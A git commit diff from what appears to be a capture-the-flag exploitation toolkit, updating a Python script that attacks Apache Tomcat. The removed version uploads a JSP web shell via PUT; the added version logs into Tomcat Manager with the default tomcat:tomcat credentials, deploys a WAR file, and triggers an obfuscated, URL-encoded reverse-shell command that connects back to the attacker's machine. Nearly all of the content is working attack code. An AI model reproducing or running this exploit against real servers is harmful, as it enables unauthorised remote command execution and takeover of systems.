ed129ed510ec648348890be285ebedfdc9cf8f0e
zz <nono@>
2026-05-12 14:42:51 +0800

    2026-05-12 14:42:51 更新

--- tomcat-pass-getshell 弱口令.py
+++ tomcat-pass-getshell 弱口令.py
@@ -1,8 +1,10 @@
+import re
+from pathlib import Path
 
-from tool.base import match_flag, process_with, get_local_ip,wait
+from tool.base import match_flag, process_with, get_local_ip, wait
 from tool.bash_obf import apply_obfs
 from tool.encode import Url
-from tool.http_repeater import repeater
+from tool.http_repeater import repeater, build_multipart_form
 from tool.shell_rb import gen_shell_r_cmd, TcpShellR
 
 
@@ -17,38 +19,50 @@ def run(target: tuple[str, int]) -> tuple[bool, str | list[str], str]:
         cmd = apply_obfs(cmd, ["base64","bash_c_ifs1"])
         if not cmd:
             return False, "", "生成反弹shell命令失败"
-        cmd = Url.encode(cmd)
 
-        req = f"""PUT /flag.jsp/ HTTP/1.1
+        cmd = Url.encode(cmd,True)
+        if not cmd:
+            return False,"","url编码失败"
+
+
+        _headers,body = build_multipart_form("flag.war",Path("static/other/flag.war"),"deployWar")
+
+        req = f"""GET /manager/html HTTP/1.1
 Host:{target[0]}:{target[1]}
+Authorization: Basic dG9tY2F0OnRvbWNhdA==
 
-
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
-<html>
-<head>
-    <title>xxx</title>
-</head>
-<body>
-<%
-  Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
-  System.out.println(process);
-%>
-</body>
-</html>
 """
-
         resp = repeater(req)
         if not resp:
             return False, "", resp.error
+        path = re.search(
+            r'<form method="post" action="([^"]+/upload[^"]+)" enctype="multipart/form-data">',
+            resp.body_text()
+        )
+        if not path:
+            print(resp.text())
+            return False, "", "获取csrfnoce失败"
 
-        req =f"""GET /flag.jsp?cmd={cmd} HTTP/1.1
+        req = f"""POST {path[1]} HTTP/1.1
 Host:{target[0]}:{target[1]}
+Authorization: Basic dG9tY2F0OnRvbWNhdA==
 
+""".replace("\n","\r\n").encode() + body
+
+        resp = repeater(req,headers=_headers)
+        if not resp:
+            return False, "", resp.error
+
+
+        req = f"""GET /flag/index.jsp?cmd={cmd} HTTP/1.1
+Host:{target[0]}:{target[1]}
+Authorization: Basic dG9tY2F0OnRvbWNhdA==
 
 """
         resp = repeater(req)
         if not resp and "Timeout" not in resp.error:
             return False, "", resp.error
+
 
         if not wait(lambda : shell.is_connected()) :
             return False, "", "等待反弹shell回连失败"
@@ -70,4 +84,4 @@ def main(ip_port: str):
 
 if __name__ == "__main__":
     __import__("tool.base", fromlist=["set_debug"]).set_debug()
-    main("192.168.192.148:30756")
+    main("192.168.192.148:30265")
--- xxx.py
+++ xxx.py
@@ -3,7 +3,7 @@ from tool.base import parse_ip_port
 
 
 if __name__ ==  "__main__":
-    ip_port = "192.168.192.148:37810,48375"
+    ip_port = "192.168.192.148:32825"
     tg = parse_ip_port(ip_port)
     for p,s in tg.detect_services():
         print(f"[{p}] {s}")
